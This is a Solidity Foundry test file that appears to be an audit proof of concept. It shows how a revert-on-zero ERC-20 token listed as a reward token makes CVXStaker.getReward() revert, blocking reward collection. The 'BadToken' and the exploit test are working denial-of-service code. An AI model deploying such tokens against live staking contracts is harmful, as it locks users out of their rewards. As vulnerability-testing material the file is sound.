// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

import "src/CVXStaker.sol";
import "src/interfaces/ICVXBooster.sol";

/*//////////////////////////////////////////////////////////////
                          TEST ASSETS
//////////////////////////////////////////////////////////////*/

contract GoodToken is ERC20 {
    constructor() ERC20("Good", "GOOD") {
        _mint(msg.sender, 1e24);
    }
}

/**
 * @notice ERC-20 that reverts when `amount == 0` – identical behaviour
 *         to the “RevertOnZero” token in the Weird-ERC20 repo.
 */
contract BadToken is ERC20 {
    constructor() ERC20("Bad", "BAD") {
        _mint(msg.sender, 1e24);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(amount > 0, "No zero-value transfers"); // <── revert on 0
        super._transfer(from, to, amount);
    }
}

/**
 * @dev Ultra-minimal stub.  CVXStaker only needs `getReward`.
 *      Returning `true` makes the call a no-op.
 */
contract MockRewardPool {
    function getReward(address, bool) external pure returns (bool) {
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
                         EXPLOIT TEST
//////////////////////////////////////////////////////////////*/

contract CVXStaker_ZeroTransfer_DOSTest is Test {
    CVXStaker        staker;
    GoodToken        good;
    BadToken         bad;
    MockRewardPool   rewardPool;

    address constant recipient = address(0xBEEF);
    address constant operator  = address(0xCAFE);

    function setUp() public {
        good       = new GoodToken();
        bad        = new BadToken();
        rewardPool = new MockRewardPool();

        // rewardTokens[1] is the malicious “revert-on-zero” token
        address[] memory rewards = new address[](2);
        rewards[0] = address(good);
        rewards[1] = address(bad);

        /**
         * Deploy CVXStaker
         *  - `_clpToken` is irrelevant for this PoC, we pass `good` just to satisfy the type.
         *  - `_booster` is never touched, so a zero address cast is fine.
         */
        staker = new CVXStaker(
            operator,
            IERC20(address(good)),
            ICVXBooster(address(0)),
            rewards
        );

        // ───────────────────────────────────────────────────────────────
        // Initial owner is the deploying test contract (`address(this)`).
        // ───────────────────────────────────────────────────────────────
        staker.setCvxPoolInfo(0, address(0), address(rewardPool));
        staker.setRewardsRecipient(recipient);

        // Fund the staker with some GOOD tokens to show that GOOD transfer succeeds
        good.transfer(address(staker), 100 ether);
    }

    /**
     * Exploit proof:
     * 1. BAD token balance inside CVXStaker is 0.
     * 2. CVXStaker.getReward() iterates over rewardTokens and
     *    unconditionally executes `safeTransfer(recipient, balance)`.
     * 3. When it reaches BAD, `balance == 0` → BAD reverts →
     *    the whole call reverts, permanently DoSing reward collection.
     */
    function test_DoS_via_RevertOnZeroTransferToken() public {
        vm.startPrank(operator);                    // only `operator` may call getReward()
        vm.expectRevert("No zero-value transfers"); // expect revert from BAD token
        staker.getReward(false);
        vm.stopPrank();
    }
}